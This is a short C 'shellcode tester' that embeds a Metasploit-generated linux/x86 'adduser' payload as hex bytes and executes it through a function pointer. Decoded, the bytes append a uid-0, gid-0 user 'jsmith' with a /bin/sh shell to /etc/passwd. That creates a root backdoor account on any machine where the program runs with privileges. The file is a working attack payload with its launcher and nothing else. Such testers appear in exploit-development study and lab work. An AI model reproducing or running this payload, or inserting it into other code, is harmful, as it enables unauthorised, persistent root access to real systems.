/*
    Shellcode tester
    Compile with:
    $ gcc -Wall -Wextra -o shellcode shellcode.c 

*/

#include <stdio.h>
#include <string.h>

/*
 * linux/x86/adduser - 93 bytes
 * http://www.metasploit.com
 * VERBOSE=false, PrependSetresuid=false, 
 * PrependSetreuid=false, PrependSetuid=false, 
 * PrependSetresgid=false, PrependSetregid=false, 
 * PrependSetgid=false, PrependChrootBreak=false, 
 * AppendExit=false, USER=jsmith, PASS=ok, SHELL=/bin/sh
 */

const char shellcode[] = 
"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x24\x00\x00\x00\x6a\x73"
"\x6d\x69\x74\x68\x3a\x41\x7a\x2e\x54\x4f\x53\x72\x67\x72\x4d"
"\x36\x72\x6f\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e"
"\x2f\x73\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01"
"\x58\xcd\x80";

/* Function pointer */
typedef int (*func_ptr)();

int main() {
    printf("Shellcode Length:  %d bytes\n", strlen(shellcode));

    ((func_ptr) shellcode)();

    return 0;
}
